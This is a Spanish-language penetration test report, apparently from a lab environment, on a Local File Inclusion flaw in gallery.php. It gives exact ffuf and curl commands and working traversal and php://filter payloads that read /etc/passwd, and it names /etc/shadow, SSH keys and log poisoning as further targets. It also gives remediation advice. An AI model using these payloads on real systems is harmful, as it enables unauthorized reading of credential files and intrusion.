# Informe de auditoría LFI — Galería de Arte Virtual

Fecha: 2026-04-27T08:03:02Z
Objetivo: http://web.dev.local:8081

Resumen ejecutivo:
- Vulnerabilidad encontrada: Local File Inclusion (LFI) en gallery.php parámetro "page".
- Explotación: Éxito. Se logró leer /etc/passwd y recuperar su contenido usando traversal y wrappers de PHP.

Detalles técnicos:
- URL objetivo probada: http://web.dev.local:8081/gallery.php?page=<payload>
- Parámetro vulnerable: page (en gallery.php)

Comandos y herramientas usados (exactos):
- Fuzzing inicial (intentos):
  - ffuf -u 'http://web.dev.local:8081/index.php?file=FUZZ' -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 40 -mc all -o /tmp/ffuf.json -of json
  - ffuf -u 'http://web.dev.local:8081/gallery.php?page=FUZZ' -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 30 -mc all -o /tmp/ffuf_gallery.json -of json
  - gobuster dir -u http://web.dev.local:8081/ -w /usr/share/wordlists/dirb/common.txt -t 30 -q
- Pruebas directas y payloads que funcionaron (curl):
  - curl -s -G 'http://web.dev.local:8081/gallery.php' --data-urlencode 'page=../../../../../../etc/passwd' -D - -o /tmp/g_out1.txt
  - curl -s -G 'http://web.dev.local:8081/gallery.php' --data-urlencode 'page=php://filter/read=convert.base64-encode/resource=/etc/passwd' -D - -o /tmp/g_out2.txt
  - curl -s -G 'http://web.dev.local:8081/index.php' --data-urlencode 'file=php://filter/read=convert.base64-encode/resource=/etc/passwd' -D - -o /tmp/lfi_out2.txt

Payloads utilizados relevantes:
- Traversal simple: ../../../../../../etc/passwd
- php wrapper (base64): php://filter/read=convert.base64-encode/resource=/etc/passwd
- Variantes con traversal + wrapper: php://filter/read=convert.base64-encode/resource=../../../../../../etc/passwd

Evidencia de explotación:
- El payload ../../../../../../etc/passwd inyectado en gallery.php?page devolvió el contenido de /etc/passwd embebido en la página HTML. Fragmento extraído:

  root:x:0:0:root:/root:/bin/bash
  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
  bin:x:2:2:bin:/bin:/usr/sbin/nologin
  ...

- La variante con php://filter devolvió la misma información en base64 (decodificable), confirmando lectura arbitraria de ficheros.

Impacto y recomendaciones:
- Impacto: Alta. Lectura de ficheros arbitraria permite enumerar usuarios y potencialmente localizar ficheros de credenciales o claves (p.ej. /etc/shadow, claves SSH) si los permisos lo permiten. Esto también puede servir como vector para escalar a RCE mediante técnicas como Log Poisoning o inclusión de archivos controlados por el atacante.
- Recomendaciones inmediatas:
  1. Evitar incluir ficheros basándose en entrada del usuario. Implementar whitelist de templates y validar/normalizar parámetros.
  2. Deshabilitar wrappers peligrosos si no son necesarios (php://, expect://, etc.) y ajustar open_basedir donde sea apropiado.
  3. Aplicar least privilege en ficheros y revisar permisos para que /etc/shadow y claves privadas no sean legibles por el usuario del servidor web.
  4. Añadir logging y detección de patrones de traversal y wrappers en WAF.

Pruebas adicionales sugeridas:
- Intentar leer /etc/shadow o /root/.ssh/id_rsa (solo si los permisos lo permiten) y pruebas de Log Poisoning para intentar RCE; en este laboratorio se consiguió lectura de /etc/passwd (explotación confirmada), pero no se intentó extraer /etc/shadow por respeto a no ampliar impacto sin autorización explícita adicional.

Archivos y salidas relevantes generadas durante la auditoría (en el entorno de pruebas):
- /tmp/g_out1.txt  (respuesta traversal)
- /tmp/g_out2.txt  (respuesta php://filter base64)
- /tmp/lfi_out*.txt (variantes probadas con index.php)
- /tmp/ffuf.json, /tmp/ffuf_gallery.json (resultados de ffuf)

Conclusión:
- LFI confirmada en gallery.php?page. Se logró explotación práctica leyendo /etc/passwd, por lo que la vulnerabilidad está confirmada y explotada en esta prueba.

--- Fin del informe ---
